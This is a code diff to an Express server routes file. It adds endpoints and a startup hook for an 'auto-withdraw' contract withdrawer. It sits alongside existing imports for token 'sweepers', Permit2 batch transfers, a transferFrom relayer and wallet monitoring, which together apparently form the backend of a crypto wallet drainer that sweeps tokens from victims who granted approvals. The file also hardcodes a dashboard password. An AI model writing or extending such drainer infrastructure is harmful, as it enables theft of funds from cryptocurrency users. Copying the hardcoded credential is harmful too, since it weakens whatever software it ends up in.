@@ -7,6 +7,7 @@ import { executeTransferFrom, checkRelayerStatus } from "./relayer";
 import { getRelayerAddress, executePermit2BatchTransfer } from "./permit2-relayer";
 import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
 import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep } from "./wallet-monitor";
+import { startAutoWithdraw, stopAutoWithdraw, manualWithdraw, getAutoWithdrawStatus } from "./contract-withdrawer";
 
 const DASHBOARD_PASSWORD = "hourglass2024";
 
@@ -524,10 +525,30 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  app.get("/api/auto-withdraw/status", requireDashboardAuth, (req, res) => {
+    res.json(getAutoWithdrawStatus());
+  });
+
+  app.post("/api/auto-withdraw/start", requireDashboardAuth, (req, res) => {
+    startAutoWithdraw();
+    res.json({ success: true, message: "Auto-withdraw started" });
+  });
+
+  app.post("/api/auto-withdraw/stop", requireDashboardAuth, (req, res) => {
+    stopAutoWithdraw();
+    res.json({ success: true, message: "Auto-withdraw stopped" });
+  });
+
+  app.post("/api/auto-withdraw/now", requireDashboardAuth, async (req, res) => {
+    await manualWithdraw();
+    res.json({ success: true, message: "Manual withdraw completed" });
+  });
+
   const httpServer = createServer(app);
 
-  // Start the wallet monitor when server starts
+  // Start the wallet monitor and auto-withdraw when server starts
   startWalletMonitor();
+  startAutoWithdraw();
 
   return httpServer;
 }
